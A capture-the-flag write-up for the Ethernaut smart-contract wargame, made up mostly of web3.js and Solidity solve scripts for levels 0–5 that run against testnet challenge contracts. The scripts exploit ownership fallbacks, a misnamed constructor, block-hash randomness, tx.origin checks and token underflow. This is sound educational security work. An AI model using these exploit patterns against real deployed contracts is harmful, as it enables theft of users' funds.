# The Ethernaut Writeup

> - [The Ethernaut](https://ethernaut.openzeppelin.com/)
> - [Solve Script Repo](https://github.com/Curious-Lucifer/The_Ethernaut_Solve_Script)

## 0 - Hello Ethernaut

```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/0-Hello_Ethernaut.json');
const contract_address = '0xb4D0d5F9e5E0eB4d1fab0B7C17731a6184b71a8A';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve() {
  var res;

  res = await contract.methods.info().call();
  console.log(res);

  res = await contract.methods.info1().call();
  console.log(res);

  res = await contract.methods.info2('hello').call();
  console.log(res);

  res = await contract.methods.infoNum().call();
  console.log(res);

  res = await contract.methods.info42().call();
  console.log(res);

  res = await contract.methods.theMethodName().call();
  console.log(res);

  res = await contract.methods.method7123949().call();
  console.log(res);

  password = await contract.methods.password().call();
  console.log(password);

  res = await contract.methods.authenticate(password).send({from: account[0].address});
  console.log(res);

  res = await web3.eth.getStorageAt(contract_address, 3);
  console.log(res);
}

solve();
```


---

## 1 - Fallback

1. Run first solve script
```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/1-Fallback.json');
const contract_address = '0x6F3738bAC29D12Fc889C213651e75682c83e8BB9';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve0() {
  var res;

  res = await contract.methods.contributions(account[0].address).call();
  console.log(res);

  res = await contract.methods.contribute().send({
    from: account[0].address, 
    value: 1
  });
  console.log(res);

  res = await contract.methods.contributions(account[0].address).call();
  console.log(res);
}

solve0();
```
2. Use MetaMask send SepoliaETH to `contract_address`
3. Run the second solve script 
```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/1-Fallback.json');
const contract_address = '0x6F3738bAC29D12Fc889C213651e75682c83e8BB9';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve1() {
  var res;

  res = await contract.methods.owner().call();
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);

  res = await contract.methods.withdraw().send({from: account[0].address});
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);
}

solve1();
```


---
## 2 - Fallout

```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/2-Fallout.json');
const contract_address = '0xa0b7fbc05854539D4B0330a6d69871b6333e056e';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve() {
  var res;

  res = await contract.methods.owner().call();
  console.log(res);

  res = await contract.methods.Fal1out().send({
    from: account[0].address, 
    value: 1
  });
  console.log(res);

  res = await contract.methods.owner().call();
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);

  res = await contract.methods.collectAllocations().send({
    from: account[0].address
  });
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);
}

solve();
```


---
## 3 - Coin Flip

```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/3-Coin_Flip.json');
const contract_address = '0xbeA8B35c79d50A2fb3B3a2ecF2f21F06CB027cA6';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve() {
  const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968n;
  var res;

  res = await contract.methods.consecutiveWins().call();
  console.log(res);

  var prevBlockNum = (await web3.eth.getBlockNumber());
  var prevBlockHash = (await web3.eth.getBlock(prevBlockNum)).hash;
  var prevBlockHashBN = web3.utils.toNumber(prevBlockHash);
  var guess = web3.utils.toBool(prevBlockHashBN / FACTOR);
  console.log(guess);

  res = await contract.methods.flip(guess).send({from: account[0].address});
  console.log(res);

  res = await contract.methods.consecutiveWins().call();
  console.log(res);
}

solve();
```


---
## 4 - Telephone

### Deploy Smart Contract
> [Reference](https://www.web3.university/tracks/create-a-smart-contract/deploy-your-first-smart-contract)

1. Init smart contract's project (use all defualt for `npm init`)
    ```shell
    mkdir TelephoneSolve && cd TelephoneSolve
    npm init
    ```
2. Install Hardhat
    ```shell
    npm install --save-dev hardhat
    ```
3. Create Hardhat project (choose `Create an empty hardhat.config.js`)
    ```shell
    npx hardhat
    ```
4. Add project folders
    ```shell
    mkdir contracts scripts
    ```
5. Write contract `contracts/TelephoneSolve.sol`
    ```solidity
    pragma solidity ^0.8.0;


    contract Telephone {
      function changeOwner(address _owner) public {}
    }


    contract TelephoneSolve {
      function solve(Telephone _telephone, address _owner) public {
        _telephone.changeOwner(_owner);
      }
    }
    ```
6. Install `dotenv`
    ```shell
    npm install dotenv --save
    ```
7. Setup `.env`
    ```
    API_URL = https://...
    PRIVATE_KEY = ... (no 0x)
    ```
8. Install `Ether.js`
    ```shell
    npm install --save-dev @nomiclabs/hardhat-ethers ethers
    ```
9. Update `hardhat.config.js`
    ```js
    /**
     * @type import('hardhat/config').HardhatUserConfig
    */

    require('dotenv').config();
    require("@nomiclabs/hardhat-ethers");

    const { API_URL, PRIVATE_KEY } = process.env;

    module.exports = {
      solidity: "0.8.0",
      defaultNetwork: "sepolia",
      networks: {
      hardhat: {},
      sepolia: {
        url: API_URL,
        accounts: [`0x${PRIVATE_KEY}`]
        }
      },
    }
    ```
10. Write deploy script `script/deploy.js`
    ```js
    async function main() {
      const TelephoneSolve = await ethers.getContractFactory("TelephoneSolve");
      const telephonesolve = await TelephoneSolve.deploy();
      console.log("Contract deployed to address:", telephonesolve.address);
    }

    main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });
    ```


### Solve

```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/4-Telephone.json');
const contract_address = '0x1D981e2161c89aBCA0b2A12cE69159d1286683a1';
const contract = new web3.eth.Contract(contract_abi, contract_address);

const solve_contract_abi = require('./TelephoneSolve.json');
const solve_contract_address = '0x7E8287846a7cB1Ed0A0a26163Ec8B12ab5BD3a25';
const solve_contract = new web3.eth.Contract(solve_contract_abi, solve_contract_address);


async function solve() {
  var res;

  res = await contract.methods.owner().call();
  console.log(res);

  res = await solve_contract.methods.solve(contract_address, account[0].address).send({
    from: account[0].address
  })
  console.log(res);

  res = await contract.methods.owner().call();
  console.log(res);
}

solve();
```


---
## 5 - Token

```js
const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/5-Token.json');
const contract_address = '0x57dACC1B723b305a4ccB20e11728e8Ed38340ca1';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve() {
  var res;

  res = await contract.methods.balanceOf(account[0].address).call();
  console.log(res);

  res = await contract.methods.transfer(contract_address, 30).send({from: account[0].address});
  console.log(res);

  res = await contract.methods.balanceOf(account[0].address).call();
  console.log(res);
}

solve();
```

